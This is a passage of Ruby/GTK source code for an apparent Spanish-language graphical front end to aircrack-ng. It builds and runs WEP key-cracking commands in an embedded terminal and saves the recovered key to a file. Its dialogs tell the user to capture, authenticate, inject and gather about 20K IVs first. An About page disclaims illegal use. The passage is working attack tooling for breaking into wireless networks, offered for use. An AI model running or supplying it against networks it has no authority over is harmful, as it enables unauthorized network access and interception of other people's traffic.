            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"\nAntes de Crackear la WEP. debes \"Atrapar, Autentificar, Injectar.\nY Obtener 20K paketes data(iv's). Algunas veces con 11K es suficiente\"")
	dialog.run
	dialog.destroy
	else
	entry_comando_C.text = "aircrack-ng -b " + $bssid + " -a 1 -n 64 -f 4 airscript-" + $ssid + "*.ivs"
	terminal_C.feed_child(entry_comando_C.text + "\n")
	end
end
#Boton de guardar
boton_C_guardar = Gtk::Button.new
hbox_boton_C_guardar = Gtk::HBox.new(false, 0)
label_boton_C_guardar = Gtk::Label.new("Guardar Pass")
icono_boton_C_guardar = Gtk::Image.new(Gtk::Stock::SAVE, Gtk::IconSize::MENU)
hbox_boton_C_guardar.pack_start(icono_boton_C_guardar, false, true, 5)
hbox_boton_C_guardar.pack_start(label_boton_C_guardar, false, true, 5)
boton_C_guardar.add(hbox_boton_C_guardar)

boton_C_guardar.signal_connect('clicked') do
if($ssid == "" || $bssid == "" || $ch == "" || $rmac == "" )
	dialog = Gtk::MessageDialog.new($ventana, 
		                            Gtk::Dialog::MODAL,
   		                 		   Gtk::MessageDialog::WARNING,
        		                    Gtk::MessageDialog::BUTTONS_CLOSE,
            		                "Debes de introducir en \"(*)Estado\" el elemento faltante:\n\nSSID=\"" + $ssid + "\"\nBSSID=\"" + $bssid + "\"\nCH=\"" + $ch + "\"\nAntes de Guardar. debes \"Atrapar, Autentificar, Injectar.\nY Obtener 20K paketes data(iv's). Algunas veces con 11K es suficiente\"")
	dialog.run
	dialog.destroy
	else
	dialog_guardar = Gtk::FileChooserDialog.new(
      "Guardar como ...",
      $ventana,
      Gtk::FileChooser::ACTION_SAVE,
      nil,
      [ Gtk::Stock::CANCEL, Gtk::Dialog::RESPONSE_CANCEL ],
      [ Gtk::Stock::SAVE, Gtk::Dialog::RESPONSE_ACCEPT ])
	  dialog_guardar.current_name = ($ssid + "-WEP.txt")
	  dialog_guardar.run do |response|
    if(response == Gtk::Dialog::RESPONSE_ACCEPT)
      $wep = dialog_guardar.filename
      dialog_guardar.destroy
	  entry_comando_C.text = "aircrack-ng -b " + $bssid + " -a 1 -n 64 -f 4 airscript-" + $ssid + "*.ivs > " + $wep
	  terminal_C.feed_child(entry_comando_C.text + "\n")
      elsif (response == Gtk::Dialog::RESPONSE_CANCEL)
      dialog_guardar.destroy
      end
  end
end
end

#boton salir en crack-WEP
salir_C = Gtk::Button.new
hbox_salir_C = Gtk::HBox.new(false, 0)
label_salir_C = Gtk::Label.new("Salir")
icono_salir_C = Gtk::Image.new(Gtk::Stock::QUIT, Gtk::IconSize::MENU)
hbox_salir_C.pack_start(icono_salir_C, false, true, 5)
hbox_salir_C.pack_start(label_salir_C, false, true, 5)
salir_C.add(hbox_salir_C)

salir_C.signal_connect('clicked') do
if ($iface == "" || $iface_old == "")
	Gtk.main_quit
	else
	system('airmon-ng stop ' + $iface)
	system('ifconfig ' + $iface_old + ' up')
	Gtk.main_quit
	end
end

vbox_crack_NB.pack_start(boton_crackear, true, false, 5)
vbox_crack_NB.pack_start(boton_C_guardar, true, false, 5)
vbox_crack_NB.pack_start(salir_C, true, false, 5)

hbox_C_comand = Gtk::HBox.new
vbox_crack_ALL.pack_start(hbox_C_comand, true, true, 5)

comando_C = Gtk::Label.new("Comando: ")
hbox_C_comand.pack_start(comando_C, false, true, 3)
hbox_C_comand.pack_start(entry_comando_C, true, true, 3)

hbox_comercial = Gtk::HBox.new
vbox_crack_ALL.pack_start(hbox_comercial, true, true, 5)

comercial = Gtk::Label.new("\"RedNux.net te necesita! Por favor dona ya sea 1.00 $USD para mantener el servidor, Dona!!\"")
hbox_comercial.pack_start(comercial, true, false, 10)

boton_comercial = Gtk::Button.new
hbox_boton_comercial = Gtk::HBox.new(false, 0)
label_boton_comercial = Gtk::Label.new("Donar al server")
icono_boton_comercial = Gtk::Image.new(Gtk::Stock::ABOUT, Gtk::IconSize::MENU)
hbox_boton_comercial.pack_start(icono_boton_comercial, false, true, 5)
hbox_boton_comercial.pack_start(label_boton_comercial, false, true, 5)
boton_comercial.add(hbox_boton_comercial)

boton_comercial.signal_connect('clicked') do
system('x-www-browser http://rednux.net/dona/ &')

end
hbox_comercial.pack_start(boton_comercial, true, false, 10 )

menu.append_page(vbox_crack_ALL, label_crack)

################ Termina el menu Crackeark-WEP ################
###############################################################

###############################################################
###################### Empieza el menu About ##################

label_about = Gtk::Label.new("About")
vbox_about = Gtk::VBox.new(false, 0)

icono_about = Gtk::Image.new(Gtk::Stock::ABOUT, Gtk::IconSize::DIALOG)

label_about_all = Gtk::Label.new("#######################################\nAUTOR:\n\nAirScript*.sh y AirScript-FE.rb y sus derivados son desarrollados\npor Bruno G. Fosados <softnuux(at)gmail.com> mas informacion\nhttp://RedNux.net\n\nEstos scripts son propiedad de RedNux(c) y estan liberados\nbajo licencia GPL v2 o posteriores. No quites esta cabezera,\ndudas, comentarios y bug's <softnuux(at)gmail.com>\n\n#######################################\nADVERTENCIA:\n\nEste script fue desarrollado unica y  exclusivamente\npara propositos educativos de prueba y demostracion.\n\nEl autor no se hace responsable por el uso \"ilegal\" que\nse le de a este script asi mismo te advertimos que lo uses\nde forma legal y no rompas la ley brother! ;)\n\n#######################################")

vbox_about.pack_start(icono_about , false, false, 5)
vbox_about.pack_start(label_about_all, false, false, 5)

menu.append_page(vbox_about, label_about)

##################### Termina el menu About ###################
###############################################################

$ventana.add(menu)
$ventana.show_all
end
Gtk.main
